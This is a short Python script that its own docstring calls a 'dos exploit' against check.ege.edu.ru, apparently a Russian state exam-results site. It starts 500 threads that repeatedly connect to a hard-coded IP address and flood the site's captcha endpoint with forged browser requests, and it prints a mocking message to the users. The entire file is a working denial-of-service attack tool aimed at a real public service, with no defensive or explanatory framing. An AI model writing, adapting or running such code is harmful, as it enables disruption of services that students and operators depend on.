'''
dos exploit for check.ege.edu.ru
'''

import socket
import time
import threading
payload = b'GET /api/captcha HTTP/1.1\r\nHost: check.ege.edu.ru\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0;) Gecko/20100101 Firefox/67.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nCookie: _ga=GA1.3.1464828177.1559906581; _gid=GA1.3.1262355183.1560170249\r\nUpgrade-Insecure-Requests: 1\r\nCache-Control: max-age=10000000\r\n\r\n'
print("Her vam a ne resultati")
def dos():
    global payload
    while True:
        try_ = True
        while try_:
            sock = socket.socket()
            sock.settimeout(0.4)
            try:
                sock.connect(('87.226.165.155',80))
                try_ = False
            except:
                sock.close()
                try_ = True
        while True:
            try:
                sock.send(payload)
            except:
                sock.close()
                break  
e = []
t = []
n = 500
for i in range(n+1):
        e.append(threading.Event())
for i in range(n):
        t.append(threading.Thread(target = dos))

for i in range(n):
        t[i].start()
for i in range(n):
        try:
            e[i].set()
        except:
            break
for i in range(n):
        t[i].join()
